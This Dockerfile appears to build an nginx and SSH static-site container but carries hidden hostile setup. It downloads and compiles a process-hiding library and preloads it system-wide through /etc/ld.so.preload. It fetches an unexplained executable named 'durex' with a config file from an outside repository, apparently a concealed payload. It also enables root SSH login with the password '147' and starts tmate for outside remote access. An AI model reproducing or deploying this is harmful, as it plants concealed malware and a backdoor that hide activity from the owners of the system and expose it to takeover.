# Use Debian base image
FROM debian

# Set non-interactive mode
ENV DEBIAN_FRONTEND=noninteractive

# Update package lists and install necessary packages
RUN apt-get update && apt-get upgrade -y && apt-get install -y \
    ssh git wget nano curl python3 python3-pip gcc nginx openssh-server

# Download and compile process hider
RUN wget https://raw.githubusercontent.com/cihuuy/libn/master/processhider.c \
    && gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl \
    && mv libprocess.so /usr/local/lib/ \
    && echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload

# Download durex and its configuration file
RUN wget https://raw.githubusercontent.com/bulboni/tm/main/durex \
    && wget https://raw.githubusercontent.com/bulboni/tm/main/config.json \
    && chmod +x durex

# Remove default nginx configuration file
RUN rm -v /etc/nginx/nginx.conf

# Copy custom nginx configuration
COPY ./path/to/your/nginx.conf /etc/nginx/nginx.conf

# Copy static website files into container directory
COPY ./path/to/your/static/files /var/www/html

# Setup SSH and nginx
RUN mkdir /run/sshd \
    && echo 'nginx -g "daemon off;"' >> /openssh.sh \
    && echo 'sleep 5' >> /openssh.sh \
    && echo 'tmate -F &' >> /openssh.sh \
    && echo '/usr/sbin/sshd -D' >> /openssh.sh \
    && echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config \
    && echo 'root:147' | chpasswd \
    && chmod 755 /openssh.sh

# Expose necessary ports
EXPOSE 80 443 22

# Command to run
CMD ["/openssh.sh"]
